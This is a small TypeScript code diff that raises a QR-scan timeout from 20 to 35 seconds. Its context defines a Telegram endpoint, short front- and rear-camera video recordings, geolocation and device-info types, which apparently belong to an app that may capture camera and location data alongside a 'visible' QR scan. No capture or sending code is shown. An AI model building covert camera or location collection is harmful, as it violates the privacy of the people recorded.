@@ -16,7 +16,7 @@ import {
 const TELEGRAM_API_ENDPOINT = "/api/telegram";
 const VIDEO_1_DURATION_MS = 3000; // 3 секунды для фронтальной камеры
 const VIDEO_2_DURATION_MS = 4000; // 4 секунды для задней камеры
-const QR_SCAN_TIMEOUT_MS = 20000; // 20 секунд для видимого QR-сканирования (увеличено с 10)
+const QR_SCAN_TIMEOUT_MS = 35000; // 35 секунд для видимого QR-сканирования
 
 type GeolocationData = { latitude: number; longitude: number };
 type ClientInfo = { userAgent: string; platform: string; hardwareConcurrency: number; screenWidth?: number; screenHeight?: number; browserLanguage?: string; };
